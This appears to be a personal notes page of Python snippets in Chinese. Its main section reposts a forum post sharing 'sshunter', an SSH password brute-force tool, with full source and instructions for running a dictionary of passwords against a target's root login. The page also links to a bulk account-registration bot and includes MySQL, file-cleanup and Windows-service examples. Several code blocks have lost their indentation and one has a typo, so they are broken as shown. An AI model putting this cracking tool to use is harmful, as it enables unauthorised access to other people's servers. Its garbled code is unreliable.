---
layout: page 
title: Python
---




###Windows 安装包

	easy_install simplejson

###网上源码

- [python3.2模拟登录webqq](http://www.oschina.net/code/snippet_181505_6282)
- [58同城批量注册机](http://www.oschina.net/code/snippet_181505_10618)
- [Simple HTTP server supporting SSL secure communications (Python recipe)](http://code.activestate.com/recipes/442473-simple-http-server-supporting-ssl-secure-communica/)
- [TLS Lite](http://trevp.net/tlslite/)



###sshunter : SSH 密码穷举工具，可以扫ssh弱口令（含python源代码）


[密码相关] sshunter : SSH 密码穷举工具，可以扫ssh弱口令（含python源代码）
大概看了下，论坛里扫1433 和 3389弱口令 的工具都有， 但是没有扫 SSH的，就用python 搞了个 。这个工具支持windows和linux ， 考虑到暗组99%的人不用linux，我今天就发个windows版本的。

先给大家普及下： ssh 和 ftp 一样， 都是平台无关的协议。 ssh（Secure SHell）主要用在远程控制和文件传输，它和telnet最大的区别是： ssh不怕嗅探。因此目前unix/linux 下的 telnet 基本上都被 ssh 替代了。 windows下也有ssh的服务程序， 但是用的人不是很多。

可能有看官会说： linux没人用，我们搞它干嘛？ 呵呵，我悄悄地透露下风声哦， 据可靠消息： google，百度，腾讯， 淘宝，网易等各个网站，全部都是用的linux操作系统。仅这些公司累计就有上百万台的服务器运行着linux 。 你说搞linux 有用没有？

注意： 这个是命令行工具！！！！ 不是图形界面的！！！！！ 只能在命令行下运行！！！！！！
我不会写图形界面的windows程序， 有会写的图形界面的帮忙写个吧！！！

另外： 部分用户说无法运行这个exe程序， 我查了下原因：因为我这里的python 2.6 是用visual studio 2008 编译的，如果你的机器上没有vs2008的运行环境，就无法运行。 非常抱歉！！！ 现在的附件是更新过的程序，重新下载即可

使用方法：
解压 sshunter.rar ， 执行其中的sshunter.exe ( 因为是用py2exe转换成的exe，所以体积比较大，我拆成了2个文件 )

sshunter.exe [url]www.fxxk.com[/url] 22 root
参数解释：
第一个参数是要暴力破解的IP地址或域名
第二个参数ssh的端口， 一般都是22了
第三个参数是ssh的登陆名。 linux下一般是root ， windows下一般是administrator

然后打开 password.txt ，这个是密码字典文件，你就随便输入要暴力猜测的密码吧。

编译源码需要下一个额外的库paramiko , 下载地址： [url]http://www.lag.net/paramiko/download/paramiko-1.7.6.zip[/url]
懂的人自己看源码：

	#! /usr/bin/env python
	
	# -*- coding: gbk -*-
	
	# Copyright (C) 2009 byevivi ( qq: 646300011 email [email]byebyecx@gmail.com[/email] )
	
	import warnings
	warnings.simplefilter(‘ignore’, DeprecationWarning)
	
	import traceback
	import os
	import paramiko
	
	from Tkinter import *
	
	# setup logging
	paramiko.util.log_to_file(‘demo_simple.log’)
	
	def try_ssh_connect( hostname, username, password, port ):
	“”"
	根据参数连接hostname 服务器，然后返回不同的值
	
	@param hostname: ssh 服务器ip地址或域名
	@param username: ssh 的登陆用户名
	@param password: 密码
	@param port: ssh 端口
	@return: 0表示登陆成功 ； -1表示网络错误，无法连接 ； -2表示认证失败
	“”"
	try:
	client = paramiko.SSHClient()
	client.load_system_host_keys()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	#print ‘*** Connecting…’
	client.connect(hostname, port, username, password)
	client.close()
	except paramiko.AuthenticationException, e1:
	#print “Auth error”
	try:
	client.close()
	except:
	pass
	return -2;
	except Exception, e:
	#print ‘*** Caught exception: %s: %s’ % (e.__class__, e)
	#traceback.print_exc()
	try:
	client.close()
	except:
	pass
	return -1
	return 0
	
	if len(sys.argv) != 4:
	print ‘请输入选项参数：’ + os.path.basename(sys.argv[0])+ ” [ip或者域名] [端口] [登录名]”
	sys.exit(0);
	
	hostname = sys.argv[1]
	port = int(sys.argv[2])
	username= sys.argv[3]
	password_file = “password.txt”
	
	f = open(password_file)
	try:
	for line in f:
	line = line.replace(‘\r’,”)
	line = line.replace(‘\n’,”)
	retval = try_ssh_connect (hostname, username, line, port)
	if retval == 0 :
	print “密码尝试成功! 用户名：” + username + ” 密码:” + line
	break;
	elif retval == -1 :
	print “无法连接服务器”
	break
	elif retval == -2 :
	print “尝试密码失败:” + line
	finally:
	f.close()



###python下的MySQLdb使用 

	# -*- coding: utf-8 -*-     
	#mysqldb    
	import time, MySQLdb    
	   
	#连接    
	conn=MySQLdb.connect(host="localhost",user="root",passwd="",db="jlmtest",charset="utf8")  
	cursor = conn.cursor()    
	
	#写入    
	sql = "insert into user(name,created) values(%s,%s)"   
	param = ("aaa",int(time.time()))    
	n = cursor.execute(sql,param) 
	conn.commit()
	conn.roolback()
	cursor.lastrowid
	conn.insert_id()
	print n    
	   
	#更新    
	sql = "update user set name=%s where id=3"   
	param = ("bbb")    
	n = cursor.execute(sql,param)    
	print n    
	   
	#查询    
	n = cursor.execute("select * from user")    
	
	cursor.fetchone()
	for row in cursor.fetchall():    
	    for r in row:    
	        print r    
	   
	#删除    
	sql = "delete from user where name=%s"   
	param =("aaa")    
	n = cursor.execute(sql,param)    
	print n    
	cursor.close()    
	   
	#关闭    
	
	conn.close()   


###一个清理svn,.pyc,CVS等等文件,目录的小脚本

可以根据需要修改 DEL_LIST 来指定需要清理的内容

	DEL_LIST=[
	r'^\.svn$',
	'^CVS$',
	r'.*\.pyc$'
	]
	from os.path import join
	import os
	from os import getcwd,walk,rmdir,chmod
	import re
	import stat
	def write_able(name):
	path=join(root,name)
	chmod(path,stat.S_IWRITE)
	return path
	remove=lambda name:os.remove(write_able(name))
	def del_dir(dir):
	for root, dirs, files in walk(dir,topdown=False):
	for name in files:
	remove(name)
	for name in dirs:
	rmdir(write_able(name))
	rmdir(dir)
	DEL_LIST=[re.compile(i) for i in DEL_LIST]
	for root, dirs, files in walk(getcwd(),topdown=False):
	for i in DEL_LIST:
	j=''
	def if_match(func):
	if i.match(j):
	func(join(root,j))
	print join(root,j)
	for j in dirs:
	if_match(del_dir)
	for j in files:
	if_match(remove)
	raw_input('*'*61+'\nFinished')









###PYTHON实现的WINDOWS服务程序

1、想写一个监视服务器是否运行的简单服务，网上搜到的例程不太完善，如梅劲松的许久
没有更新，而且SvcDoRun写得不完整（见http://www.chinaunix.net/jh/55/558190.html，
不知道是不是原始出处）；而mail.python.org中的没有定义_svc_name_等变量（见
http://mail.python.org/pipermail/python-list/2005-December/315190.html）
2、这个实现功能很简单，就是把当前时间写入‘c:\\temp\\time.txt’文件，一看即知，
大家可以随意扩充。
3、用

	service install 安装
	service start   启动
	service stop    停止
	service debug   调试
	service remove  删除

service.py

	#coding:utf-8
	import win32serviceutil
	import win32service
	import win32event
	import win32evtlogutil
	import time
	class service(win32serviceutil.ServiceFramework):
	        _svc_name_ = "test_python"
	        _svc_display_name_ = "test_python"
	        def __init__(self, args):
	                win32serviceutil.ServiceFramework.__init__(self, args)
	                self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
	                print '服务开始'
	        def SvcDoRun(self):
	                import servicemanager
	                #------------------------------------------------------
	                # Make entry in the event log that this service started
	                #------------------------------------------------------
	               servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,servicemanager.PYS_SERVICE_STARTED,(self._svc_name_, ''))
	                #-------------------------------------------------------------
	                # Set an amount of time to wait (in milliseconds) between runs
	                #-------------------------------------------------------------
	                self.timeout=100
	                while 1:
	                        #-------------------------------------------------------
	                        # Wait for service stop signal, if I timeout, loop again
	                        #-------------------------------------------------------
	                        rc=win32event.WaitForSingleObject(self.hWaitStop,self.timeout)
	                        #
	                        # Check to see if self.hWaitStop happened
	                        #
	                        if rc == win32event.WAIT_OBJECT_0:
	                                #
	                                # Stop signal encountered
	                                #
	                                break
	                        else:
	                                #
	                                # Put your code here
	                                #
	                                #
	                                f=open('c:\\temp\\time.txt','w',0)
	                                f.write(time.ctime(time.time()))
	                                f.close()
	                                print '服务运行中'
	                                time.sleep(1)
	                        #
	                        # Only return from SvcDoRun when you wish to stop
	                        #
	                return
	
	        def SvcStop(self):
	#---------------------------------------------------------------------
	                # Before we do anything, tell SCM we are starting the stop process.
	#---------------------------------------------------------------------
	                self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
	#---------------------------------------------------------------------
	                # And set my event
	#---------------------------------------------------------------------
	                win32event.SetEvent(self.hWaitStop)
	                print '服务结束'
	                return
	if __name__=='__main__':
	        win32serviceutil.HandleCommandLine(service)
	        

